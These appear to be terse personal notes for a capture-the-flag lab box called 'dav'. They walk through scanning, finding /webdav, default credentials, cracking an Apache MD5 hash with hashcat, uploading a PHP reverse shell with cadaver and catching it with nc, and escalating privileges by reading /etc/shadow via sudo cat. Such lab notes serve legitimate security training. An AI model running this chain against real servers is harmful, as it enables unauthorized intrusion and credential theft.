---
date: 2024-06-19
author: mrashco
title: dav
tags: ["", ""]
categories: 
series:
---
[YouTube Walkthrough](https://youtu.be/UDLqISuGiEY) 

rustscan

- 80
- Apache/2.4.18

feroxbuster

- /webdav

Try: Burpsuite - [bruteforce basic http auth](https://securityonline.info/use-burp-suite-brute-force-http-basic-authentication/)

Search - [webdav default credentials](https://search.brave.com/search?q=webdav+default+credentials&source=web) [^](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html)

- w*****:x*****

`hashid $hash`

Try: MD5(APR) or Apache MD5 [^](https://hashcat.net/wiki/doku.php?id=example_hashes)

- `hashcat -m 1600 hash.txt $rockyou.txt`

`cadaver <http://$ip/webdav`> [^](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/)

- revshell = shell.php
- `put shell.php`
- `nc -lnvp $port`
- `http://$ip/webdav/shell.php`

Upgrade Shell

- `python3 -c "import pty; pty.spawn('/bin/bash')"`
- `[CTRL+Z]`
- `stty raw -echo;fg`
- `export TERM=xterm`

PrivEsc [^](https://www.hackingarticles.in/linux-for-pentester-cat-privilege-escalation/)

- `sudo -l` = `/bin/cat`
- `cat /etc/shadow`
- `cat /root/root.txt`